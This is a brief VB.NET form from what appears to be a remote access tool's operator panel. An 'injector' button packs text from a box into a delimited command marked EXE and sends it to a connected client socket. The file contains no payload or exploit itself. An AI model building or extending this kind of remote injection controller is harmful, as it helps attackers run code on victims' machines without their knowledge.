Imports System.Threading

Public Class Injector_Form


    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Me.Close()
    End Sub

    Private Async Sub UcBtnExt1_BtnClick(sender As Object, e As EventArgs) Handles UcBtnExt1.BtnClick


        Dim o As String = Form1.PL_IJCT & "|SP1|" & "" & "|SP2|" & "|EXE|" & "|SP2|" & RichTextBox1.Text & "|ENDING|"



        Await Task.Run(Sub() SenderHelper.SenderHelper(Form1.CliSt, Label4.Text, o))
    End Sub
End Class